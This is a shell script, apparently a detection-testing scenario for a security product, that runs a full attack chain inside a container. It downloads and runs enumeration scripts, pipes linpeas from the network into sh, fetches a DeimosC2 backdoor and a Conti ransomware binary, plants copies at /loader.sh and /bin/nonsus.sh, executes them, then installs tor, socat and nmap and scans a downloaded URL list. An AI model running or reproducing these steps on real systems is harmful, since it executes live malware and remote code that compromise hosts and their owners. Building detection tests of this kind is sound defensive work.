#!/bin/sh
# Configured for a Busybox container written by hreed@paloaltonetworks.com
# APS shell enviorment > standard tools 

# SENARIO 1 --- Script Activity / Linux Enumeration 
# Outcomes - detect suspicous script activity 
echo "Senario 1 - Smart Enumartion Script Activity"
# Step 1 - Download the 
echo "[+] Downloading enumeration script using wget..."
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O enum_script.sh

# Step 2: Make the Enumeration Script Executable
echo "[+] Making the enumeration script executable..."
chmod 700 enum_script.sh
sleep 10

# Step 3: Run the Enumeration Script in a Docker Container
echo "[+] Executing enumeration script."
sh enum_script.sh
sleep 3

# Step 3 More Smart Enumerations 
echo "[+] Download linpeas for fun"
wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# SENARIO 2 --- Local Malware 
echo "Senario 2 - Malware Protection - Wildfire Analysis"
# Step 1 - Unix Backdoor Senario 
echo "[+] Downloading Unixbackdoor Script "
wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
chmod 700 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
sleep 3

# Senario 1.A Local Malware Persisitance 
# Create Shadow Copies 
echo "[+] Creating copies in suspicious pladces"
cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /loader.sh
chmod 700 /loader.sh

# Additional Shadow Cppies 
echo "[+] Creating more shadow copies" 
cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /bin/nonsus.sh
chmod 700 /bin/nonsus.sh 
sleep 10 

# make executaable
echo "[+] Making unixbackdoor executable"
chmod 700 unixbackdoor.sh
# execute 
#echo "[+] Executing the Unix BackDoor"
#05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64

# Step 2 - Conti
echo "[+] Downloading Conti-C2 malware"
wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O conti.sh
sleep 3

# Make Executable 
echo "[+] making conti ransoware executable"
chmod 700 conti.sh
sleep 3

# Step 3 - c2 
echo "[+] downloading C2 client " 
wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O c2.sh
sleep 5

# Make Executable 
echo "[+] Changing C2 file permissions: executable" 
chmod 700 c2.sh
sleep 7

# Exectuion of Malware and Handlening 
echo "[+] callin malware executables"
05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
conti.sh || true 
c2.sh || true 

# Senario In Progress 
# Downloading and executing security toolsets 
apk update 
apk add --no-cache gcc g++
apk add --no-cache clang llvm

## donload address list 
wget https://gist.githubusercontent.com/jgamblin/62fadd8aa321f7f6a482912a6a317ea3/raw/33c6752125188cfdacdeee3f4fd6e01909e50eef/urls.txt -O url.txt 

### install nmap  
apk add nmap 
apk add tor 
apk add socat 
apk add clean 

###
nmap -iL url.txt 



